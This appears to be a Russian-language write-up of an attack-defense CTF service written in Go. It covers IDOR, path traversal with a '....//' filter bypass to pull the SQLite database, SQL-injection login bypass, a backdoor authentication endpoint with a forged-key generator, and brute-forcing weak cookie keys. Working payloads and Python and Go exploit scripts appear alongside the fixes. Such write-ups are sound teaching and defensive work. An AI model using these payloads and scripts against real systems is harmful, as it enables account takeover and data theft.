# IDOR
При подтверждении заявки на получение флага не прописана проверка на принадлежность подозреваемого пользователю, который подтверждает заявку. Таким образом можно подтверждать чужие заявки и выдавать флаги не будучи их владельцем.
В service/app_logic/handlers/acceptclaim.go отметается лишь вариант с тем, когда пользователь подтверждает свои же заявки.
```
	if claim.UserID == user.ID {
		http.Redirect(w, r, "/claim_manager?err=wrong_claim_id", http.StatusSeeOther)
		return
	}
```
Таким образом можно создать две учетных записи, с одной - сделать заявку на поимку преступника, а с другой - подтвердить эту же заявку.

Один из возможных фиксов: дописать во всё тот же acceptclaim.go проверку, не дающую подтверждать заявку если соответствующий подозреваемый принадлежит кому-то другому.
```
	if sus.AuthorID != user.ID {
		http.Redirect(w, r, "/claim_manager?err=wrong_claim_id", http.StatusSeeOther)
		return
	}
```
# Path Traversal
Функция "Скачать досье" при просмотре странички подозреваемого позволяет при переопределении параметров скачать любой файл (например файл БД sqlite).
В html-форме видно, что при скачивании досье пользователем подается два значения:
```
  <div class="form-control">
      <form style="margin-top: 20px; margin-bottom: 10px;" action="/download_profile" method="POST">
          <input type="hidden" name="ID" value="{{.Sus.ID}}" />
          <input type="hidden" name="ext" value=".png" />
          <button class="sus_btn" type="submit">Скачать досье</button>
      </form>
  </div>
```
Первое - это ID подозреваемого, а второе - расширение (ext). 
В исходном коде нас интересуют два файла: service/app_logic/handlers/download_profile.go и service/app_logic/utils/create_profile.go
Если просмотреть содержимое service/app_logic/handlers/download_profile.go, то становится ясно, что при не соответствии введенных пользователем данных ID какого-либо подозреваемого в любом случае вызывается функция utils.CreateSusProfile.
```
	susID, e := strconv.Atoi(r.FormValue("ID"))
	ext := r.FormValue("ext")
	if e != nil {
		susID = 0
	}
	sus := models.Suspect{
		ID: uint(susID),
	}
	if err := db.DB.First(&sus, uint(susID)).Error; err != nil {
		sus.AuthorID = 0
		sus.CrimeDesc = "Unknown"
		sus.SusDesc = "Unknown"
		sus.SusName = "Unknown"
	}
	utils.CreateSusProfile(w, r, susID, r.FormValue("ID"), ext, sus, user)
```
В самой же utils.CreateSusProfile происходит следующее (переменная req это r.FormValue("ID"), то бишь переданный пользователем ID):
```
	imgID := strings.ReplaceAll(req, "../", "")
	imagePath := "static/sus/" + imgID + ext
	imageFile, err := os.Open(imagePath)
```
Дальше полученный imageFile пакуется в архив и передаётся пользователю. 
При легитимных запросах пользователю выдаётся картинка по пути service/static/sus/x.png, где x - ID подозреваемого. Однако вместо ID можно подать путь до БД, а расширение с дефолтного .png поменять на .db.
Нужный нам путь из папки /static/sus/: 
```
	/static/sus/../../MSPD2.db
```
Формируем пейлоад:
```
	{"ID":"../../MSPD2","ext":".db"}
```
Поскольку при формировании конечного пути происходит фильтрация последовательности символов "../":
```
	imgID := strings.ReplaceAll(req, "../", "")
```
Конечный пейлоад будет выглядеть так:
```
	{"ID":"....//....//MSPD2","ext":".db"}
```
Стучимся на нужный URL, передавая наш пейлоад:
```
	s = requests.Session()
	# сперва нужно авторизоваться
	req = s.post(url+"/authorize", hacker_creds)
	req = s.post(url+"/download_profile", data={"ID":"....//....//MSPD2","ext":".db"})
```
В скачавшемся архиве будет находиться файл БД, из которого можно будет легко вытащить флаги.

В качестве возможного фикса уязвимости можно заставить app_logic/handlers/download_profile.go выкидывать ошибку всегда, когда введенный пользователем ID нельзя конвертировать в int, а расширение всегда считать как .png:
```
	susID, e := strconv.Atoi(r.FormValue("ID"))
	ext := ".png" //ext := r.FormValue("ext")
	if e != nil {
		utils.DropError(w, r, err, http.StatusBadRequest) //susID = 0
		return
	}
```
# SQL injection
Взглянем на реализацию авторизации (app_logic/handlers/authorization.go):
```
func Authorize(w http.ResponseWriter, r *http.Request) {
	user := models.User{
		Username: r.FormValue("username"),
		Password: utils.HashPassword(r.FormValue("password")),
	}
	queryResult := db.DB.Select("id, username, password").First(&user, fmt.Sprintf("username = '%v' AND password = '%v'", user.Username, user.Password))
	if queryResult.Error != nil {
		http.Redirect(w, r, "/sign_in?err=wrong_user", http.StatusSeeOther)
		return
	}
```
Так делать совсем не надо:
```
	queryResult := db.DB.Select("id, username, password").First(&user, fmt.Sprintf("username = '%v' AND password = '%v'", user.Username, user.Password))
```
Данный код уязвим к SQL-инъекциям, т.к. пользовательский ввод никак не экранируется. Можно вовсе обойти проверку пароля простейшей инъекцией в поле username:
```
	Логин
	neriael'--
	Пароль
	ego_vse_ravno_ne_proveryat
```
Нужные имена пользователей можно распарсить из профилей подозреваемых (/sus/1, /sus/2 и т.д.). Дальше остаётся лишь автоматизировать эксплойт.

Более безопасный код для взаимодействия с БД при авторизации:
```
	queryResult := db.DB.Take(&user, "username=? AND password=?", user.Username, user.Password)
	if queryResult.Error != nil {
		http.Redirect(w, r, "/sign_in?err=wrong_user", http.StatusSeeOther)
		return
	}
``` 
# Дополнительная скрытая функция авторизации
Файл /app_logic/router/routes.go содержит функцию, определяющую пути, по которым можно обращаться к сервису. Среди них есть одна странная строчка:
```
	http.HandleFunc("POST /authorize_gosuslugi", handlers.AuthGosuslugi)
```
Взглянем на /app_logic/handlers/authorize_gosuslugi.go. Исходя из данного файла видно, что при POST-запросе на /authorize_gosuslugi нужно передать username и некий gosuslugi_auth_key. 
После чего вызывается функция utils.CheckAuthKey(guAuthKey, user.Username, r). Если функция отрабатывает без ошибки, то пользователю выдаётся cookie-файл, позволяющий действовать от лица username.
Код utils.CheckAuthKey:
```
func CheckAuthKey(auth_key string, username string, r *http.Request) (err error) {
	if r.Referer() != "https://www.gosuslugi.ru/" {
		return errors.New("bad request")
	}
	if len(auth_key) != 108 {
		return errors.New("auth key is too short")
	}
	ending := auth_key[len(auth_key)-32:]
	hash := md5.Sum([]byte(username))
	hashed_str := hex.EncodeToString(hash[:])
	if ending != hashed_str {
		return errors.New("failed to check auth key")
	}
	re := regexp.MustCompile(`^NXvP\d{3}[a-zA-Z]{2}-\d{6}#([a-zA-Z]{6})-(?:([A-Z][a-z]){3})-(\d{10})@(\d+)#\?{3}[a-zA-Z0-9]{32}$`)
	if re.MatchString(auth_key) {
		return nil
	}
	return errors.New("failed to check auth key")
}
```
Исходя из него можно понять следующее:
1. Запрос должен иметь в качестве заголовка Referer значение "https://www.gosuslugi.ru/".
2. Длина ключа должна быть равна 108.
3. Последние 32 символа ключа должны совпадать с md5-хэшем username
4. Ключ должен попадать под регулярное выражение ^NXvP\d{3}[a-zA-Z]{2}-\d{6}#([a-zA-Z]{6})-(?:([A-Z][a-z]){3})-(\d{10})@(\d+)#\?{3}[a-zA-Z0-9]{32}$
   
Подготовим пейлоад:
```
	"NXvP000qw-123456#qwerty-KeKeKe-1234567890@012345678901234567890123456789#???" + md5_hash(username)
```
По аналогии с эксплуатацией через SQLi нужно распарсить имена пользователей, а затем просматривать флаги от их лица. Сам процесс авторизации при помощи уязвимой функции выглядит так:
```
	def create_md5(str):
		hash = hashlib.md5(str.encode('utf-8'))
		return hash.hexdigest()
	def create_data(username):
		data = {
		"username": username,
		"gosuslugi_auth_key": "NXvP000qw-123456#qwerty-KeKeKe-1234567890@012345678901234567890123456789#???" + create_md5(username)
		}
		return data
	headers = {
	    "Referer": "https://www.gosuslugi.ru/"
	}
	s = requests.Session()
	req = s.post(url+"/authorize_gosuslugi", headers=headers, data=create_data(username))
```
Для закрытия уязвимости вполне достаточно удалить данную "фичу", больше напоминающую бэкдор. Если чекер не скажет ничего против удаления (а он не скажет), то данное радикальное решение вполне оправдает себя.
# Weak cookie encryption
Файл app_logic/utils/cookies.go инициализирует "защищенное" хранилище cookie:
```
	var SC *securecookie.SecureCookie
	
	func init() {
		SC = securecookie.New([]byte(config.KeyDict[rand.Int()%len(config.KeyDict)]), []byte(config.KeyDict[rand.Int()%len(config.KeyDict)]))
	}
```
Посмотрим в описание функции securecookie.New:
```
	func securecookie.New(hashKey []byte, blockKey []byte) *securecookie.SecureCookie
	New returns a new SecureCookie.
	hashKey is required, used to authenticate values using HMAC. Create it using GenerateRandomKey(). It is recommended to use a key with 32 or 64 bytes.
	blockKey is optional, used to encrypt values.
```
Теперь ясно, что в качестве аргументов подаются ключи для шифрования. В нашем случае при генерации ключей происходит обращение к некоему config.KeyDict. Просмотрим config/config.go:
```
	var KeyDict [10]string
	func init() {
		// TODO: use random key generation
		KeyDict = [10]string{"nerisande", "neriael", "neriyuko", "nerielys", "nerysgosa", "nerieth", "neriett", "neridana", "neriss", "neri"}
		for i := range KeyDict {
			KeyDict[i] = padWithZeros(KeyDict[i], 32)
		}
	}
```
В коде даже есть намёк на то, что стоило бы использовать случайную генерацию ключей (это в общем-то и является закрытием уязвимости). Сами же ключи берутся случайно из весьма небольшого списка {"nerisande", "neriael", "neriyuko", "nerielys", "nerysgosa", "nerieth", "neriett", "neridana", "neriss", "neri"}.

Дабы не вникать в особенности и тонкости работы используемой в сервисе библиотеки securecookie можно использовать её же для генерации фальшивых cookie, взяв любое валидное имя пользователя:
```
	KeyDict = [10]string{"nerisande", "neriael", "neriyuko", "nerielys", "nerysgosa", "nerieth", "neriett", "neridana", "neriss", "neri"}
	for i := range KeyDict {
		KeyDict[i] = padWithZeros(KeyDict[i], 32)
	}
	for i := 0; i < len(KeyDict); i++ {
		for j := 0; j < len(KeyDict); j++ {
			keyPair := KeyPair{
				key1: KeyDict[i],
				key2: KeyDict[j],
			}
			AllKeys = append(AllKeys, keyPair)
		}
	}
	for _, pair := range AllKeys {
		SC = securecookie.New([]byte(pair.key1), []byte(pair.key2))
		c, e := SC.Encode("User", username)
		if e != nil {
			fmt.Println(e)
			return
		}
		fmt.Println(c, pair)
	}
```
Данный код выводит зашифрованую куку и пару ключей, которая использовалась для её шифрования.
Вывод можно скормить другой части эксплойта на python:
```
	def brute_keys():
	    global is_builded
	    if not is_builded:
		subprocess.run(["go", "build", "-o", output_file, "main.go"], check=True)
	    command = "generate_keys"
	    username = hacker_creds["username"]
	    result = subprocess.run([output_file, command, username], capture_output=True, text=True)
	    output_lines = result.stdout.splitlines()
	    cookie_arr = []
	    for i in output_lines:
		cookie_arr.append(i.split())
	    req = requests.post(url+"/register", hacker_creds)
	    s = requests.Session()
	    for i in cookie_arr:
		req = s.get(url+"/sus_uploader", cookies={'User':i[0]})
		if req.status_code == 200:
		    key1 = i[1][1:]
		    key2 = i[2][:-1]
		    break
	    return key1, key2
```
Как только сервис сможет впустить на одну из страниц, требующих авторизации - значит брутфорс ключей прошел успешно. Дальше остаётся только получить список пользователей, затем можно просматривать флаги от их лица используя cookie, сгенерированные нами же с помощью уже известной пары ключей.
